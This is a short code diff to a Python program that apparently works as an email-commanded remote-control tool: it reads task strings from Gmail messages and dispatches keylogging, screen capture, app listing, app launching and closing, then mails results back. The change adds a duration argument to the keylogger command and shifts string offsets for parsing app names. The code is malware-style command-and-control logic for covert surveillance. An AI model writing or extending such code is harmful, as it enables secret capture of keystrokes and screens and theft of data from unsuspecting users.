@@ -23,8 +23,9 @@ SCOPES = ["https://mail.google.com/"]
 def handle(myAr, mail):
     print("Handling Mail")
     for task in myAr:
-        if task == "[key_logger]":
-            service.keylogger()
+        if task.find("[key_logger]") != -1:
+            duration = task[13:]
+            service.keylogger(int(duration))
         if task == "[screen_capture]":
             service.screenshot()
         if task == "[list_app]":
@@ -54,10 +55,10 @@ def handle(myAr, mail):
             gmail_send_message(mail)
             service.logout()
         if task.find("[start_app]") != -1:
-            appName = task[11:]
+            appName = task[12:]
             service.openApplication(appName)
         if task.find("[close_app]") != -1:
-            appName = task[11:]
+            appName = task[12:]
             service.closeApplication(appName)
     gmail_send_message(mail)
 
